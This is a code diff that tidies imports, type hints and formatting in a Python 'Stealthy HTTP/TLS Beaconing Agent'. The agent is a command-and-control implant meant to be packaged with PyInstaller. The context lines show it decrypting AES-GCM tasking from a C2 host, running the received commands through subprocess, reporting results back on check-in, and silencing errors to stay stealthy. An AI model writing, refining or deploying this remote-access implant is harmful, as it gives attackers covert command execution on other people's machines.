@@ -4,16 +4,14 @@ Stealthy HTTP/TLS Beaconing Agent.
 Can be compiled with PyInstaller for deployment.
 """
 
-import os
-import logging
-import sys
-import time
 import json
-import uuid
-import socket
+import logging
+import os
 import platform
-import subprocess
 import random
+import socket
+import subprocess
+import time
 
 try:
     import requests
@@ -24,7 +22,10 @@ except ImportError:
     pass
 
 import base64
+from typing import Optional
+
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
 
 class BeaconAgent:
     def __init__(self, c2_host: str, c2_port: int, psk: str, use_tls: bool = False):
@@ -48,7 +49,8 @@ class BeaconAgent:
 
     def decrypt(self, b64_ciphertext: str) -> dict:
         raw = base64.b64decode(b64_ciphertext)
-        if len(raw) < 12: return {}
+        if len(raw) < 12:
+            return {}
         nonce, ciphertext = raw[:12], raw[12:]
         plaintext = self.aesgcm.decrypt(nonce, ciphertext, None)
         return json.loads(plaintext.decode("utf-8"))
@@ -89,9 +91,9 @@ class BeaconAgent:
         except subprocess.TimeoutExpired:
             return {"command": command, "output": "[!] Command timed out."}
         except Exception as e:
-            return {"command": command, "output": f"[!] Execution failed: {str(e)}"}
+            return {"command": command, "output": f"[!] Execution failed: {e!s}"}
 
-    def beacon(self, results: list = None):
+    def beacon(self, results: Optional[list] = None):
         """Check in with C2 and retrieve tasks."""
         if not self.agent_id:
             return
@@ -121,7 +123,7 @@ class BeaconAgent:
                 if new_results:
                     self.beacon(results=new_results)
                     
-        except Exception as e:
+        except Exception:
             pass # Suppress network errors to stay stealthy
 
     def run(self):
